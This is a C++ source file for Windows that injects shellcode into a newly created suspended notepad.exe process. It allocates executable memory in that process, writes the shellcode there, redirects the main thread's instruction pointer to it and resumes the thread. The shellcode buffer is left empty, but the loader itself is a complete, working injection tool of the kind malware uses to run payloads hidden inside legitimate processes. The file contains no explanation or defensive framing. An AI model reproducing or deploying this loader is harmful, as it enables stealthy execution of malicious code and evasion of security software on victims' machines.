#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")


int main(int argc, char** argv) {
    char shellcode[] =  "";

    SIZE_T shell_size = sizeof(shellcode);

    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    DWORD return_length = 0;

    // Create a Suspended Process
    if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, si, pi)) {
        std::cout << "[-] Failed to create process." << '\n';
        return 1;
    }

    std::cout << "[+] Process created successfully." << '\n';
    std::cout << "[*] PID: " << pi->dwProcessId << '\n';

    // Allocate Memory
    PVOID start = VirtualAllocEx(pi->hProcess, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (start == NULL) {
        std::cout << "[-] Failed to allocate memory in target process." << '\n';
        TerminateProcess(pi->hProcess, 0);
        return 1;
    }
    std::cout << "[+] Memory allocated successfully in target process." << '\n';


    // Write the Shell Code
    if (!WriteProcessMemory(pi->hProcess, start, shellcode, shell_size, NULL)) {
        std::cout << "[-] Failed to write shellcode to target process memory." << '\n';
        TerminateProcess(pi->hProcess, 0);
        return 1;
    }
    std::cout << "[+] Shellcode written to memory successfully." << '\n';


    // Get Thread Context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi->hThread, &ctx)) {
        std::cout << "[-] Failed to get thread context." << '\n';
        TerminateProcess(pi->hProcess, 0);
        return 1;
    }
    std::cout << "[+] Retrieved thread context successfully." << '\n';

    // Set Thread Context
    ctx.Rip = (DWORD64)start;
    if (!SetThreadContext(pi->hThread, &ctx)) {
        std::cout << "[-] Failed to set thread context." << '\n';
        TerminateProcess(pi->hProcess, 0);
        return 1;
    }
    std::cout << "[+] Set thread context successfully." << '\n';

    ResumeThread(pi->hThread);

    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);

    return 0;
}
